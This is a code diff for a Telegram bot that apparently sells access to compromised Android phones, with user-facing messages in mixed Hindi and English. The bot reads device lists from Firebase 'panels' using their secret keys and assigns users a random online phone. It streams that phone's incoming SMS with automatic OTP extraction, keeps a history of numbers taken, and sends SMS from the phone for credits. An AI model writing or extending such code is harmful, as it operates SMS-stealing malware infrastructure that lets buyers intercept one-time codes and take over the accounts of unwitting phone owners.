@@ -1,7 +1,9 @@
 import TelegramBot from "node-telegram-bot-api";
 import { db, botUsersTable, panelsTable, giftCardsTable, referralsTable } from "@workspace/db";
 import { eq, and } from "drizzle-orm";
-import { fetchPanelDevices, fetchDeviceSms } from "./firebase";
+import { fetchPanelDevices, fetchDeviceSms, sendSmsViaFirebase } from "./firebase";
+import * as fs from "fs";
+import * as path from "path";
 import { logger } from "./logger";
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
@@ -480,12 +482,59 @@ function buildChannelKeyboard(joined: boolean[], allJoined: boolean): { inline_k
   return { inline_keyboard: rows };
 }
 
-async function getAllOnlineDevices() {
+// ─── Numbers History (file-based, like PHP bot) ───────────────────────────────
+interface NumberHistoryEntry {
+  deviceId: string;
+  phoneNumber: string;
+  deviceName: string;
+  panelId: number;
+  panelName: string;
+  takenAt: number; // epoch ms
+}
+
+const HISTORY_FILE = path.join(process.cwd(), "numbers-history.json");
+
+function loadNumbersHistory(): Record<string, NumberHistoryEntry[]> {
+  try {
+    if (fs.existsSync(HISTORY_FILE)) {
+      return JSON.parse(fs.readFileSync(HISTORY_FILE, "utf8"));
+    }
+  } catch { /* ignore */ }
+  return {};
+}
+
+function saveNumbersHistory(data: Record<string, NumberHistoryEntry[]>) {
+  try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(data, null, 2)); } catch { /* ignore */ }
+}
+
+function addToNumbersHistory(telegramId: string, entry: NumberHistoryEntry) {
+  const data = loadNumbersHistory();
+  if (!data[telegramId]) data[telegramId] = [];
+  // Avoid exact duplicate (same deviceId taken within last 5 mins)
+  const recent = data[telegramId].find(
+    h => h.deviceId === entry.deviceId && Date.now() - h.takenAt < 5 * 60 * 1000
+  );
+  if (!recent) {
+    data[telegramId].unshift(entry); // newest first
+    if (data[telegramId].length > 20) data[telegramId] = data[telegramId].slice(0, 20);
+    saveNumbersHistory(data);
+  }
+}
+
+// Active devices = online (status true) AND lastSeen within last 1 hour
+// If lastSeenTs is null, trust the status field (some apps don't report timestamp)
+async function getAllActiveDevices() {
   const panels = await db.select().from(panelsTable);
   const all = [];
+  const oneHourAgo = Date.now() - 60 * 60 * 1000;
   for (const panel of panels) {
     const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
-    all.push(...devices.filter((d) => d.status));
+    const active = devices.filter(d => {
+      if (!d.status) return false;
+      if (d.lastSeenTs !== null) return d.lastSeenTs >= oneHourAgo;
+      return true; // no timestamp → trust status
+    });
+    all.push(...active);
   }
   return all;
 }
@@ -617,8 +666,8 @@ function setupHandlers(bot: TelegramBot) {
           { parse_mode: "HTML" }
         );
 
-        const onlineDevices = await getAllOnlineDevices();
-        if (onlineDevices.length === 0) {
+        const activeDevices = await getAllActiveDevices();
+        if (activeDevices.length === 0) {
           await send(
             chatId,
  `${em(E.offline, "")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
@@ -628,12 +677,22 @@ function setupHandlers(bot: TelegramBot) {
           return;
         }
 
-        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];
+        const device = activeDevices[Math.floor(Math.random() * activeDevices.length)];
 
         await db
           .update(botUsersTable)
           .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId, state: "number_menu" })
           .where(eq(botUsersTable.id, user.id));
+
+        // Save to numbers history
+        addToNumbersHistory(telegramId, {
+          deviceId: device.id,
+          phoneNumber: device.phoneNumber || "—",
+          deviceName: device.name || device.model || device.id,
+          panelId: device.panelId,
+          panelName: device.panelName,
+          takenAt: Date.now(),
+        });
 
         const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
         const remainingMin = Math.floor(remainingMs / 60000);
@@ -644,13 +703,13 @@ function setupHandlers(bot: TelegramBot) {
           `${divider()}\n\n` +
           `${em(E.id, "")} <b>DEVICE ID</b>    : N${device.id}\n` +
           `${em(E.phone, "")} <b>NUMBER</b>      : ${device.phoneNumber || "Unknown"}\n` +
-          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
-          `${em(E.db, "")} <b>DATABASE</b>    : ${device.panelId}\n` +
-          `${em(E.check, "")} <b>STATUS</b>      : ONLINE\n` +
+          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device.name || device.model || device.id}\n` +
+          `${em(E.db, "")} <b>DATABASE</b>    : ${device.panelName}\n` +
+          `${em(E.check, "")} <b>STATUS</b>      : ${em(E.online, "")} ONLINE\n` +
           `${em(E.battery, "")} <b>BATTERY</b>     : ${device.battery || "—"}\n` +
           `${divider()}\n\n` +
           `${em(E.timer, "")} ACCESS — ${remainingMin}m REMAINING\n` +
-          `${em(E.history, "")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
+          `${em(E.history, "")} NUMBERS HISTORY MEIN SAVED — ANYTIME DEKHO.`,
           { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
         );
         return;
@@ -673,8 +732,8 @@ function setupHandlers(bot: TelegramBot) {
           { parse_mode: "HTML" }
         );
 
-        const onlineDevices = await getAllOnlineDevices();
-        if (onlineDevices.length === 0) {
+        const activeDevices2 = await getAllActiveDevices();
+        if (activeDevices2.length === 0) {
           await send(
             chatId,
  `${em(E.offline, "")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
@@ -684,12 +743,22 @@ function setupHandlers(bot: TelegramBot) {
           return;
         }
 
-        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];
+        const device2 = activeDevices2[Math.floor(Math.random() * activeDevices2.length)];
 
         await db
           .update(botUsersTable)
-          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId })
+          .set({ assignedDeviceId: device2.id, assignedPanelId: device2.panelId })
           .where(eq(botUsersTable.id, user.id));
+
+        // Save to numbers history
+        addToNumbersHistory(telegramId, {
+          deviceId: device2.id,
+          phoneNumber: device2.phoneNumber || "—",
+          deviceName: device2.name || device2.model || device2.id,
+          panelId: device2.panelId,
+          panelName: device2.panelName,
+          takenAt: Date.now(),
+        });
 
         const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
         const remainingMin = Math.floor(remainingMs / 60000);
@@ -698,15 +767,15 @@ function setupHandlers(bot: TelegramBot) {
           chatId,
  `${em(E.lightning, "")} <b>RANDOM NUMBER GENERATED!</b>\n` +
           `${divider()}\n\n` +
-          `${em(E.id, "")} <b>DEVICE ID</b>    : N${device.id}\n` +
-          `${em(E.phone, "")} <b>NUMBER</b>      : ${device.phoneNumber || "Unknown"}\n` +
-          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
-          `${em(E.db, "")} <b>DATABASE</b>    : ${device.panelId}\n` +
-          `${em(E.check, "")} <b>STATUS</b>      : ONLINE\n` +
-          `${em(E.battery, "")} <b>BATTERY</b>     : ${device.battery || "—"}\n` +
+          `${em(E.id, "")} <b>DEVICE ID</b>    : N${device2.id}\n` +
+          `${em(E.phone, "")} <b>NUMBER</b>      : ${device2.phoneNumber || "Unknown"}\n` +
+          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device2.name || device2.model || device2.id}\n` +
+          `${em(E.db, "")} <b>DATABASE</b>    : ${device2.panelName}\n` +
+          `${em(E.check, "")} <b>STATUS</b>      : ${em(E.online, "")} ONLINE\n` +
+          `${em(E.battery, "")} <b>BATTERY</b>     : ${device2.battery || "—"}\n` +
           `${divider()}\n\n` +
           `${em(E.timer, "")} ACCESS — ${remainingMin}m REMAINING\n` +
-          `${em(E.history, "")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
+          `${em(E.history, "")} NUMBERS HISTORY MEIN SAVED — ANYTIME DEKHO.`,
           { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
         );
         return;
@@ -727,13 +796,18 @@ function setupHandlers(bot: TelegramBot) {
         const existing = watchIntervals.get(telegramId);
         if (existing) clearInterval(existing);
 
+        // Get phone number from history to show in watch message
+        const histData = loadNumbersHistory();
+        const lastEntry = histData[telegramId]?.find(h => h.deviceId === user.assignedDeviceId);
+        const watchPhone = lastEntry?.phoneNumber || user.assignedDeviceId;
+
         await send(
           chatId,
  `${em(E.eye, "")} <b>WATCHING FOR OTPS...</b>\n` +
           `${divider()}\n\n` +
-          `${em(E.phone, "")} <b>NUMBER:</b> ${user.assignedDeviceId}\n\n` +
-          `NEW OTP/SMS WILL ARRIVE HERE IN REAL-TIME.\n` +
-          `${em(E.warn, "")} SPAM / RECHARGE SMS ARE AUTO-BLOCKED.\n\n` +
+          `${em(E.phone, "")} <b>NUMBER:</b> <code>${watchPhone}</code>\n\n` +
+          `${em(E.lightning, "")} NEW OTP/SMS REAL-TIME FORWARD HOGA.\n` +
+          `${em(E.warn, "")} WATCH CHAL RAHA HAI — HAR 10 SECONDS MEIN CHECK.\n\n` +
           `${em(E.stop, "")} TAP <b>STOP WATCH</b> TO STOP.`,
           { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
         );
@@ -743,15 +817,18 @@ function setupHandlers(bot: TelegramBot) {
             const msgs = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId!);
             if (msgs.length === 0) return;
             const latest = msgs[0];
- const key = `${latest.sender}:${latest.text}:${latest.time}`;
+            const key = `${latest.sender}:${latest.text}:${latest.time}`;
             if (key !== watchLastSms.get(telegramId)) {
               watchLastSms.set(telegramId, key);
               const otp = latest.text.match(/\b\d{4,8}\b/)?.[0];
               await send(
                 chatId,
- `${em(E.lightning, "")} <b>NEW SMS RECEIVED!</b>\n\n` +
-                `From: <code>${latest.sender}</code>\nTime: ${latest.time}\n\n${latest.text}` +
-                (otp ? `\n\n${em(E.check, "")} <b>OTP: ${otp}</b>` : ""),
+ `${em(E.sms, "")} <b>LIVE SMS RECEIVED!</b>\n` +
+                `${divider()}\n\n` +
+                `${em(E.phone, "")} <b>From:</b> <code>${latest.sender}</code>\n` +
+                `${em(E.timer, "")} <b>Time:</b> ${latest.time || "—"}\n\n` +
+                `${em(E.history, "")} <b>Message:</b>\n<code>${latest.text}</code>` +
+                (otp ? `\n\n${em(E.key, "")} <b>OTP DETECTED: <code>${otp}</code></b>` : ""),
                 { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
               );
             }
@@ -791,34 +868,61 @@ function setupHandlers(bot: TelegramBot) {
         if (messages.length === 0) {
           await send(
             chatId,
- `${em(E.history, "")} <b>NO SMS HISTORY FOUND.</b>`,
+ `${em(E.history, "")} <b>KOI SMS NAHI MILA.</b>\n\nAbhi tak is number pe koi SMS nahi aaya.`,
             { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
           );
           return;
         }
-        const lines = messages
-          .slice(0, 10)
- .map((m, i) => `${i + 1}. <b>${m.sender}</b>\n ${m.time}\n ${m.text.slice(0, 100)}`)
-          .join("\n\n");
+        // Show latest 5 messages with OTP extraction
+        const top5 = messages.slice(0, 5);
+        const lines = top5.map((m, i) => {
+          const otp = m.text.match(/\b\d{4,8}\b/)?.[0];
+          return (
+            `<b>${i + 1}. ${m.sender}</b>\n` +
+            `${em(E.timer, "")} ${m.time || "—"}\n` +
+            `<code>${m.text.slice(0, 120)}</code>` +
+            (otp ? `\n${em(E.key, "")} <b>OTP: <code>${otp}</code></b>` : "")
+          );
+        }).join(`\n${divider()}\n`);
 
         await send(
           chatId,
- `${em(E.history, "")} <b>SMS HISTORY (${messages.length} msgs)</b>\n${divider()}\n\n${lines}`,
+ `${em(E.history, "")} <b>SMS HISTORY</b> (${messages.length} total, showing 5 latest)\n${divider()}\n\n${lines}`,
           { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
         );
         return;
       }
 
       if (text === sct("NUMBERS HISTORY")) {
-        if (!user.assignedDeviceId || !user.assignedPanelId) {
-          await send(chatId, "Koi number assign nahi hai abhi.", { reply_markup: mainMenuKeyboard() as any });
+        const histAll = loadNumbersHistory();
+        const userHist = histAll[telegramId] || [];
+
+        if (userHist.length === 0) {
+          await send(
+            chatId,
+ `${em(E.phone, "")} <b>NUMBERS HISTORY</b>\n${divider()}\n\n` +
+            `Abhi tak koi number generate nahi hua.\nPehle <b>GET NUMBER</b> dabao!`,
+            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
+          );
           return;
         }
+
+        // Show last 5
+        const last5 = userHist.slice(0, 5);
+        const histLines = last5.map((h, i) => {
+          const ago = Math.floor((Date.now() - h.takenAt) / 60000);
+          const agoStr = ago < 60 ? `${ago}m ago` : `${Math.floor(ago / 60)}h ago`;
+          return (
+            `<b>${i + 1}. ${h.phoneNumber}</b>\n` +
+            `${em(E.profile, "")} ${h.deviceName}\n` +
+            `${em(E.db, "")} ${h.panelName}\n` +
+            `${em(E.timer, "")} ${agoStr}`
+          );
+        }).join(`\n${divider()}\n`);
+
         await send(
           chatId,
- `${em(E.phone, "")} <b>NUMBERS HISTORY</b>\n${divider()}\n\n` +
-          `${em(E.id, "")} <b>LAST ASSIGNED:</b> N${user.assignedDeviceId}\n` +
-          `${em(E.db, "")} <b>PANEL ID:</b> ${user.assignedPanelId}`,
+ `${em(E.phone, "")} <b>NUMBERS HISTORY</b> (${userHist.length} total)\n${divider()}\n\n${histLines}`,
           { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
         );
         return;
@@ -1164,26 +1268,60 @@ function setupHandlers(bot: TelegramBot) {
           const message  = parts.join("|").trim();
 
           if (!phoneNum || !message) {
-            await send(chatId, "Invalid format. Use: NUMBER|MESSAGE");
+            await send(chatId, `${em(E.warn, "")} Invalid format. Use: <code>NUMBER|MESSAGE</code>`, { parse_mode: "HTML" });
             return;
           }
 
+          if (!user.assignedDeviceId || !user.assignedPanelId) {
+            await send(chatId, `${em(E.warn, "")} Pehle GET NUMBER dabao — koi device assign nahi hai.`, { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any });
+            await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
+            return;
+          }
+
+          // Send via Firebase
+          const [smsPanel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
+
+          await send(chatId, `${em(E.refresh, "")} <b>SMS BHEJ RAHA HOON...</b>`, { parse_mode: "HTML" });
+
+          let smsOk = false;
+          if (smsPanel) {
+            smsOk = await sendSmsViaFirebase(
+              smsPanel.firebaseUrl,
+              smsPanel.secretKey,
+              user.assignedDeviceId,
+              phoneNum,
+              message
+            );
+          }
+
+          const newCredits = Math.max(0, user.smsCredits - 1);
           await db
             .update(botUsersTable)
-            .set({ smsCredits: Math.max(0, user.smsCredits - 1), state: "main_menu" })
+            .set({ smsCredits: newCredits, state: "main_menu" })
             .where(eq(botUsersTable.id, user.id));
 
-          await send(
-            chatId,
- `${em(E.check, "")} <b>SMS QUEUED!</b>\n\n` +
-            `${em(E.phone, "")} <b>TO:</b> ${phoneNum}\n` +
-            `${em(E.history, "")} <b>MESSAGE:</b> ${message}\n\n` +
-            `${em(E.credits, "")} CREDITS REMAINING: ${user.smsCredits - 1}`,
-            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
-          );
+          if (smsOk) {
+            await send(
+              chatId,
+ `${em(E.check, "")} <b>SMS SENT SUCCESSFULLY!</b>\n${divider()}\n\n` +
+              `${em(E.phone, "")} <b>TO:</b> <code>${phoneNum}</code>\n` +
+              `${em(E.history, "")} <b>MESSAGE:</b> ${message}\n\n` +
+              `${em(E.credits, "")} CREDITS REMAINING: ${newCredits}`,
+              { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+            );
+          } else {
+            await send(
+              chatId,
+ `${em(E.warn, "")} <b>SMS SEND FAILED!</b>\n\nDevice se connection nahi hua. Ensure karo device online hai.\n` +
+              `${em(E.credits, "")} Credit deduct nahi hua — balance: ${user.smsCredits}`,
+              { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+            );
+            // Restore credits since send failed
+            await db.update(botUsersTable).set({ smsCredits: user.smsCredits }).where(eq(botUsersTable.id, user.id));
+          }
           return;
         }
-        await send(chatId, "Format: NUMBER|MESSAGE\nExample: 9876543210|Hello");
+        await send(chatId, `${em(E.warn, "")} Format: <code>NUMBER|MESSAGE</code>\nExample: <code>9876543210|Hello test</code>`, { parse_mode: "HTML" });
         return;
       }
 
